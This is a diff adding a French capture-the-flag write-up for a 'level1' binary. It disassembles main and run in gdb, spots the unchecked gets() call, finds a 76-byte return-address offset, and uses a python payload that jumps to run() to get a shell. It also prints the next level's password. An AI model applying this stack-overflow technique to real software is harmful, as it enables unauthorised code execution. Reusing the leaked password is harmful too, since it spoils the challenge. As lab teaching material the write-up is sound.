@@ -1,0 +1,69 @@
+Nous sommes ici en presence d'un executable level1. En utilisant objdump -d level1 et en nous interessant a la section .text (section qui correspond au code du programme nous constatons la presence de deux fonctions dans ce programme qui sont respectivement les fonctions main et run.
+Desassemblons le main grace a gdb :
+gdb level1
+disas main 
+--> 
+   0x08048480 <+0>:	push   %ebp
+   0x08048481 <+1>:	mov    %esp,%ebp
+   0x08048483 <+3>:	and    $0xfffffff0,%esp
+   0x08048486 <+6>:	sub    $0x50,%esp
+   0x08048489 <+9>:	lea    0x10(%esp),%eax
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave
+   0x08048496 <+22>:	ret
+
+Nous constatons ici un appel a la fonction gets mais pas a la fonction run. Que fais la fonction gets ? gets() lit une ligne depuis stdin et la place dans le tampon pointé par s jusqu'à atteindre un retour-chariot, ou EOF, qu'il remplace par « \0 ». Il n'y a pas de vérification de débordement de tampon (cf man page). Il serait donc logique que nous soyons en presence d'une faille applicative de type buffer overflow.
+En effet lorsque nous lancons le binaire ce dernier attend bien un entree sur l’entree standard et lorsque nous entrons une tres longue chaine de caractere nous avons bien la presence dun Segfault.
+De plus en desassemblant la fonction qu’avons nous ? :
+gdb level1
+disas run
+-->
+   0x08048444 <+0>:	push   ebp
+   0x08048445 <+1>:	mov    ebp,esp
+   0x08048447 <+3>:	sub    esp,0x18
+   0x0804844a <+6>:	mov    eax,ds:0x80497c0
+   0x0804844f <+11>:	mov    edx,eax
+   0x08048451 <+13>:	mov    eax,0x8048570
+   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
+   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
+   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
+   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
+   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
+   0x0804847e <+58>:	leave
+   0x0804847f <+59>:	ret
+Nous remarquons un appel a la fonction system qui va prendre en argument “/bin/sh”. Le shell sera donc bien lancé grace a cette fonction run
+Exploitons maintenant cette vulnerabilité.
+Il va falloir trouver l’offset du registre EIP de la fonction gets afin de pouvoir reecrire dessus. En utilisant ce site : https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ nous serons en mesure de trouver cet offset
+gdb level1
+r
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Stopped reason: SIGSEGV
+0x63413563 in ?? ()
+L’offset est de 76. Nous voulons apres cela faire un appel a la fonction run. L’adresse de debut de la fonction run sur la stack est de 0x08048444 donc il faudra decomposer \x44\x84\x04\x08 comme nous sommes en Little Endian
+Afin de ce faire nous allons creer un fichier /tmp/over de la facon suivant :
+python -c “print “A” * 76 + ‘\x44\x84\x04\x08’” > /tmp/over
+Puis executons le binaire avec ce fichier grace a :
+cat /tmp/over - | ./level1
+Un shell est bel et bien ouvert et nous avons la main dessus
+cd ../level2
+cat ./pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
